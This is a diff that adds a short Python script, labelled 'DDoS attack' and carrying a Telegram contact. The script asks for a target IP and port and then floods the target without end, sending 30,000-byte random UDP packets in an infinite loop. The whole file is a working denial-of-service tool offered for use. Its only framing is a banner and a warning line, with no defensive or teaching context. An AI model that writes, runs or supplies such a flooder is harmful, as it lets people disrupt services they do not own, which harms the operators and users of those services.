@@ -1,0 +1,21 @@
+print("DDoS attack")
+print("Telegram:@oldboyy77")
+print("Warning!")
+
+import os,time,socket,random
+
+s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+
+packet=random._urandom(30000)
+
+port=int(input("Target port 80,443 :"))
+
+ipp=input("Target IP Adress or url :")
+
+sent=0
+
+
+while True:
+    s.sendto(packet,(ipp,port))
+    sent+=1
+    print("DDoS is working {} port - {} ip - {} DDoS request ".format(port,ipp,sent))
